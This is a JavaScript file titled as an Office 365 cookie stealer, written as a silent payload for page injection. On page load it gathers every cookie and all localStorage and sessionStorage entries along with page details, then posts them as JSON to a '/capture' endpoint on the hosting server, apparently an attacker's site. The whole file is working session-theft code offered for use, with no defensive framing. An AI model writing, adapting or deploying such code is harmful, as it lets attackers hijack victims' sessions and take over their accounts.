// =============================================
// OFFICE 365 COOKIE STEALER - SILENT PAYLOAD
// =============================================

(function() {
    'use strict';
    
    console.log('🕵️ Office 365 Cookie Stealer Active');
    
    // =============================================
    // ✅ FIXED: Auto-detects your Railway URL!
    // =============================================
    const SERVER_URL = window.location.origin + '/capture';
    
    // =============================================
    // 1. COLLECT ALL COOKIES
    // =============================================
    function collectCookies() {
        const cookies = {};
        const cookieStrings = document.cookie.split(';');
        
        for (const cookie of cookieStrings) {
            if (cookie.trim()) {
                const [name, ...valueParts] = cookie.trim().split('=');
                cookies[name] = valueParts.join('=');
            }
        }
        
        return cookies;
    }
    
    // =============================================
    // 2. COLLECT LOCAL STORAGE
    // =============================================
    function collectLocalStorage() {
        const data = {};
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                data[key] = localStorage.getItem(key);
            }
        } catch (e) {}
        return data;
    }
    
    // =============================================
    // 3. COLLECT SESSION STORAGE
    // =============================================
    function collectSessionStorage() {
        const data = {};
        try {
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                data[key] = sessionStorage.getItem(key);
            }
        } catch (e) {}
        return data;
    }
    
    // =============================================
    // 4. COLLECT PAGE DATA
    // =============================================
    function collectPageData() {
        return {
            url: window.location.href,
            hostname: window.location.hostname,
            referrer: document.referrer || 'Direct',
            title: document.title,
            timestamp: new Date().toISOString()
        };
    }
    
    // =============================================
    // 5. SEND DATA TO SERVER
    // =============================================
    async function sendData(data) {
        try {
            const response = await fetch(SERVER_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': navigator.userAgent,
                    'Cookie': document.cookie
                },
                body: JSON.stringify(data)
            });
            
            return response.ok;
        } catch (error) {
            console.error('Send error:', error.message);
            return false;
        }
    }
    
    // =============================================
    // 6. MAIN EXECUTION
    // =============================================
    async function execute() {
        try {
            // Collect all data
            const cookies = collectCookies();
            const localStorage = collectLocalStorage();
            const sessionStorage = collectSessionStorage();
            const pageData = collectPageData();
            
            // Build payload
            const payload = {
                url: window.location.href,
                hostname: window.location.hostname,
                pageData: pageData,
                cookies: cookies,
                localStorage: localStorage,
                sessionStorage: sessionStorage,
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString(),
                cookieCount: Object.keys(cookies).length,
                localStorageCount: Object.keys(localStorage).length,
                sessionStorageCount: Object.keys(sessionStorage).length
            };
            
            console.log(`📊 Collected: ${Object.keys(cookies).length} cookies`);
            console.log(`💾 Local: ${Object.keys(localStorage).length} items`);
            console.log(`📦 Session: ${Object.keys(sessionStorage).length} items`);
            
            // Send to server
            const sent = await sendData(payload);
            
            if (sent) {
                console.log('✅ Data sent to server');
            } else {
                console.log('⚠️ Data send failed');
            }
            
        } catch (error) {
            console.error('Execution error:', error.message);
        }
    }
    
    // =============================================
    // 7. RUN
    // =============================================
    if (document.readyState === 'complete') {
        setTimeout(execute, 500);
    } else {
        window.addEventListener('load', function() {
            setTimeout(execute, 500);
        });
    }
    
    console.log('🕵️ Office 365 Cookie Stealer ready');
    console.log(`📡 Sending to: ${SERVER_URL}`);
    
})();
